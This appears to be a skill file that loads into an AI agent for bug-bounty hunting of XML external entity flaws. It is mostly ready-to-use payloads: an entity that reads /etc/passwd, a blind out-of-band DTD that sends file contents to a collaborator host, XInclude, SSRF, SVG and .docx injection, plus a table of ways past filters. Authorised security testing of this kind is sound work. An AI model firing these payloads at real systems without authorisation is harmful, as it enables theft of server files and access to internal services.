---
name: hunt-xxe
description: XML external entity attack — classic, blind, OOB, parameter entities, SOAP/SAML/SVG vectors.
keywords: [xxe, xml external entity, xinclude, soap, svg, docx, ods, dtd, parameter entity, oob xxe]
---

# hunt-xxe

## When this skill loads

Triggers: "xxe", "xml injection", "external entity", "xinclude",
"soap", "wsdl", "docx", "svg upload", "office open xml".

## Where to look

XML is hidden in places:
- SOAP/WS-* APIs (`/services/`, `.asmx`)
- SAML responses (route to `hunt-saml`)
- SVG uploads (image)
- OOXML files (.docx, .xlsx, .pptx) — `[Content_Types].xml`
- RSS / Atom / OPML imports
- `application/xml` POST bodies
- iOS plist (`application/x-plist`)
- XML-RPC endpoints (`/xmlrpc.php`)

## Phase 1 — classic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Wrap in the target's existing XML schema if it requires specific
elements. If response reflects the entity → confirmed.

## Phase 2 — blind (OOB)

When entities aren't reflected, use parameter entities + remote DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://<collab>.oast.fun/evil.dtd">
  %ext;
]>
<foo>x</foo>
```

`evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<collab>.oast.fun/?d=%file;'>">
%eval;
%exfil;
```

Watch collab for DNS hit + the leaked file in the path.

## Phase 3 — XInclude (no DOCTYPE needed)

When DOCTYPE is filtered:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Works on Xerces (Java) and some others.

## Phase 4 — SSRF via XXE

```xml
<!ENTITY xxe SYSTEM "http://internal.svc/admin">
```

Same surface as `hunt-ssrf` — IMDS, internal admin UIs.

## Phase 5 — DoS (rarely useful, often excluded)

Billion laughs, quadratic blowup. Most programs exclude DoS — skip.

## Phase 6 — SVG-specific

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

Upload + view the SVG. Server-side SVG → PDF / SVG → PNG conversion
is a frequent trigger.

## Phase 7 — OOXML

Unzip a `.docx`, edit `word/document.xml`, inject XXE in the
existing `<w:document>` root, re-zip, upload. The Office parser
often resolves entities on the server side (Aspose / Apache POI).

## Bypass matrix

| Defense | Bypass |
|---|---|
| DOCTYPE filtered | XInclude (no DTD) |
| External DTD blocked | Inline parameter entities with `data:` URIs (some parsers) |
| `file://` blocked | `http://127.0.0.1/`, `jar:`, `expect:`, `php://filter/` |
| UTF-8 only | UTF-16, UTF-7 (legacy parsers) |
| Specific element required | Wrap payload inside the schema |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2014-3660 / libxml2 default-resolve | Many app stacks affected pre-2015 |
| CVE-2017-9248 (Telerik) | XXE via UI for ASP.NET |
| CVE-2021-22569 (Protobuf-Java) | tangential |
| CVE-2024-22024 (Ivanti SSRF/XXE in SAML) | SAML XXE in production VPN |
| H1 #312543 (Stripo) | OOXML XXE via image upload |
| H1 #321659 (Tumblr) | SVG XXE via profile avatar |

## Never-submit fallbacks

- DOCTYPE allowed but server returns no entity expansion → CHAIN
  REQUIRED (find OOB)
- Local-only file read in a path that contains nothing sensitive →
  DOWNGRADE
- DoS-only (Billion Laughs) → KILL on most programs

## See also

- `hunt-ssrf` — XXE is a SSRF primitive
- `hunt-saml` — every SAML library is an XXE candidate
- `hunt-file-upload` — SVG / OOXML upload vector
